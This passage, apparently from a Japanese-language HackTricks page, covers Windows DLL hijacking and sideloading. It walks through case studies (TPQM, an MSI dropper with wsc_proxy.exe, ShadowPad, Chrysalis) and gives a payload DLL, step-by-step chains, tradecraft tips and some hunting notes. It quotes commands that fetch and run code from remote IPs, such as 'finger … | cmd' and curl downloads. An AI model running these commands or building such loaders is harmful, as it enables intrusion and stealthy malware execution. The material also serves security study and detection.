MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして `hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールタスクが午前9時30分に実行されるまで待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は中程度の整合性レベルで管理者のセッション内で実行されます。
4. 標準的な UAC bypass techniques を連鎖させ、中程度の整合性レベルから SYSTEM 権限へ昇格します。

## ケーススタディ: MSI CustomAction Dropper + 署名済み Host (wsc_proxy.exe) 経由の DLL Side-Loading

Threat actors は、信頼された署名済みプロセスの下で payloads を実行するために、MSI-based droppers と DLL side-loading を頻繁に組み合わせます。<sup>[[10]](#references)</sup>

チェーン概要
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction がサイレントに実行され（例: LaunchApplication または VBScript action）、embedded resources から次の stage を再構築します。
- Dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます（組み合わせの例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows DLL search order により、まず working directory から wsc.dll がロードされ、署名済み parent の下で attacker code が実行されます (ATT&CK T1574.001)。

MSI 分析（確認する項目）
- CustomAction table:
- executable または VBScript を実行する entries を確認します。疑わしい pattern の例: background で embedded file を実行する LaunchApplication。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary tables を調査します。
- MSI CAB 内の embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用します: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結および復号される、複数の小さな fragments を探します。一般的な flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- これら2つのファイルを同じフォルダに配置します。
- wsc_proxy.exe: 正規の署名済みhost（Avast）。このprocessは、ディレクトリ内から名前でwsc.dllのloadを試みます。
- wsc.dll: attackerのDLL。特定のexportsが不要な場合は、DllMainで十分です。それ以外の場合は、proxy DLLを作成し、payloadをDllMainで実行しながら、必要なexportsを正規のlibraryにforwardします。
- 最小限のDLL payloadをbuildします:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export要件では、proxying framework（例: DLLirant/Spartacus）を使用して、payloadも実行するforwarding DLLを生成します。

- この手法は、host binaryによるDLL name resolutionに依存します。hostがabsolute pathまたはsafe loading flag（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackは失敗する可能性があります。
- KnownDLLs、SxS、forwarded exportsは優先順位に影響する可能性があるため、host binaryとexport setの選定時に考慮する必要があります。

## 署名付きtriad + 暗号化payload（ShadowPadのcase study）

Check Pointは、Ink Dragonがコアpayloadをディスク上で暗号化したまま、正規ソフトウェアに紛れ込ませるため、**3ファイルのtriad**を使用してShadowPadを展開する方法を解説しました。<sup>[[12]](#references)</sup>

1. **署名付きhost EXE** – AMD、Realtek、NVIDIAなどのvendorが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者はWindows binaryに見えるよう実行ファイルの名前を変更しますが、Authenticode signatureは有効なままです。
2. **悪意のあるloader DLL** – 期待される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）でEXEの隣に配置されます。このDLLは通常、ScatterBrain frameworkでobfuscateされたMFC binaryであり、暗号化blobを探し、復号し、ShadowPadをreflectively mapすることだけを行います。
3. **暗号化payload blob** – 同じdirectory内に`<name>.tmp`として保存されることが多くあります。復号したpayloadをmemory-mapした後、loaderはforensic evidenceを破壊するためTMP fileを削除します。

Tradecraftに関する注意:

* 署名付きEXEの名前を変更し（PE header内の元の`OriginalFileName`は維持）、Windows binaryを装いながらvendor signatureを保持できます。そのため、Ink Dragonの手法を再現する場合は、実際にはAMD/NVIDIA utilityである`conhost.exe`風のbinaryを配置します。
* executableはtrustedなままなので、allowlisting controlの大半では、悪意のあるDLLをその隣に配置するだけで済みます。loader DLLのカスタマイズに注力し、署名付きparentは通常そのまま実行できます。
* ShadowPadのdecryptorは、TMP blobがloaderの隣にあり、mapping後にfileをzero outできるようwritableであることを想定しています。payloadがloadされるまでdirectoryをwritableに保ちます。memory内に入った後は、OPSECのためTMP fileを安全に削除できます。

### LOLBAS stager + staged archive sideloading chain（finger → tar/curl → WMI）

OperatorsはDLL sideloadingとLOLBASを組み合わせ、ディスク上のcustom artifactをtrusted EXEの隣に置く悪意のあるDLLだけにします。<sup>[[1]](#references)</sup>

- **Remote command loader（Finger）:** Hidden PowerShellが`cmd.exe /c`をspawnし、Finger serverからcommandを取得して`cmd`へpipeします:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`はTCP/79のtextを取得し、`| cmd`がserver responseを実行するため、operatorsはsecond stage serverをserver-sideで切り替えられます。

- **Built-in download/extract:** benignなextensionのarchiveをdownloadしてunpackし、randomな`%LocalAppData%` folderの下にsideload targetとDLLをstageします:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`はprogressを隠してredirectに従います。`tar -xf`はWindows built-inのtarを使用します。

- **WMI/CIM launch:** WMI経由でEXEをstartするため、colocated DLLのload中にtelemetry上ではCIM-created processとして表示されます:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLLを優先するbinary（例: `intelbq.exe`、`nearby_share.exe`）で動作し、payload（例: Remcos）はtrusted nameの下で実行されます。

- **Hunting:** `/p`、`/m`、`/c`が同時に現れる`forfiles`にalertを設定します。これはadmin script以外では一般的ではありません。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

最近のLotus Blossom intrusionでは、trusted update chainを悪用し、DLL sideloadと完全なin-memory payloadをstageするNSIS-packed dropperをdeliveryしました。<sup>[[13]](#references)</sup>

Tradecraftの流れ
- `update.exe`（NSIS）は`%AppData%\Bluetooth`を作成し、**HIDDEN**属性を付け、名前を変更したBitdefender Submission Wizardの`BluetoothService.exe`、悪意のある`log.dll`、暗号化blob `BluetoothService`をdropしてからEXEをlaunchします。
- host EXEは`log.dll`をimportし、`LogInit`/`LogWrite`をcallします。`LogInit`はblobをmmap-loadし、`LogWrite`はcustom LCG-based stream（定数 **0x19660D** / **0x3C6EF35F**、key materialは以前のhashからderive）で復号し、bufferをplaintext shellcodeでoverwriteし、一時データをfreeしてshellcodeへjumpします。
- IATを避けるため、loaderはFNV-1a basis 0x811C9DC5 + prime 0x100019を使用してexport nameをhashし、Murmur-style avalanche（**0x85EBCA6B**）を適用した後、salted target hashと比較してAPIをresolveします。

Main shellcode（Chrysalis）
- 5回のpassにわたり、key `gQ2JR&9;`を使用したadd/XOR/subの反復によってPE-like main moduleを復号し、`Kernel32.dll` → `GetProcAddress`を動的にloadしてimport resolutionを完了します。
- DLL name stringをcharacterごとのbit-rotate/XOR transformでruntimeに再構築し、その後`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`をloadします。
- 2つ目のresolverは**PEB → InMemoryOrderModuleList**をたどり、各export tableを4-byte block単位でMurmur-style mixingしながらparseします。hashが見つからない場合のみ`GetProcAddress`へfallbackします。

Embedded configuration & C2
- Configはdropされた`BluetoothService` file内の**offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7`でRC4-decryptされ、C2 URLとUser-Agentが現れます。
- Beaconはdot-delimited host profileを構築し、tag `4Q`をprependした後、key `vAuig34%^325hGV`でRC4-encryptして、HTTPS上で`HttpSendRequestA`に渡します。ResponseはRC4-decryptされ、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）によってdispatchされます。
- Execution modeはCLI argsで制御されます。引数なしの場合は`-i`を指すpersistence（service/Run key）をinstallし、`-i`は`-k`付きでselfをrelaunchし、`-k`はinstallをskipしてpayloadを実行します。

Alternate loader observed
- 同じintrusionではTiny C Compilerもdropされ、`C:\ProgramData\USOShared\`から`svchost.exe -nostdlib -run conf.c`が実行され、隣には`libtcc.dll`が置かれていました。attackerが提供したC sourceにはshellcodeが埋め込まれており、PEをディスクに書き込まずにcompileしてin-memoryで実行していました。次のように再現できます:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC-based compile-and-run stage は実行時に `Wininet.dll` を import し、hardcoded URL から second-stage shellcode を取得することで、compiler run を装う柔軟な loader を実現していました。

## export proxying + host thread parking を用いた Signed-host sideloading

一部の DLL sideloading chain では、malicious DLL の読み込み後にクラッシュするのではなく、legitimate host が後続 stage を安全に読み込めるだけの時間稼働し続けるよう、**stability engineering** が追加されます。<sup>[[11]](#references)</sup>

観測されたパターン
- 期待される dependency name（`version.dll` など）を使用して、trusted EXE を malicious DLL と同じ場所に配置する。
- malicious DLL は、期待されるすべての export を real system DLL（例: `%SystemRoot%\\System32\\version.dll`）へ proxy することで、import resolution が成功し続け、host process が動作し続けるようにする。
- 読み込み後、malicious DLL は host entry point に **patch** を適用し、main thread が終了または process を終了させる code path を実行する代わりに、無限の `Sleep` loop に入るようにする。
- 新しい thread が実際の malicious work を実行する。具体的には、next-stage DLL の name または path を復号（RC4/XOR が一般的）し、その後 `LoadLibrary` で起動する。

この点が重要な理由
- 通常の DLL proxying は API compatibility を維持しますが、後続 stage に十分な時間 host が稼働し続けることまでは保証しません。
- main thread を `Sleep(INFINITE)` で parking することは、loader が worker thread で復号、staging、または network bootstrap を実行している間、signed process を resident に保つ簡単な方法です。
- 疑わしい `DllMain` だけを hunting していると、host entry point が patch され、secondary thread が開始された後に興味深い挙動が発生するこのパターンを見逃す可能性があります。

最小限の workflow
1. signed host EXE をコピーし、local directory から解決される DLL を特定する。
2. 同じ function を export し、それらを legitimate DLL に forward する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. その thread から host entry point または main thread start routine に patch を適用し、`Sleep` の loop に入るようにする。
5. next-stage DLL の name/config を復号し、`LoadLibrary` を呼び出すか payload を manual-map する。

Defensive pivots
- `System32` ではなく、自身の application directory から `version.dll` または同様に一般的な library を load する signed process。
- image load の直後に process entry point に適用される memory patch。特に、`Sleep`/`SleepEx` に redirect される jump/call。
- proxy DLL によって作成され、復号された name を持つ second DLL に対して直ちに `LoadLibrary` を呼び出す thread。
- `ProgramData`、`%TEMP%`、または unpacked archive path などの writable staging directory 内で、vendor executable の隣に配置された full-export proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows における DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore が Europe を標的とする新たな Malware を展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks と Windows Helpers が出会うとき](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT を配布する進化する Impersonation Campaigns の解剖](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Southeast Asian Government を標的とする Threat Clusters の分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network と Stealthy Offensive Operation の内部構造を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom の toolkit の詳細分析](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens の 2026 Espionage Campaigns を追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict 中の Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が Southeast Asian Governments と Critical Infrastructure を標的化](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
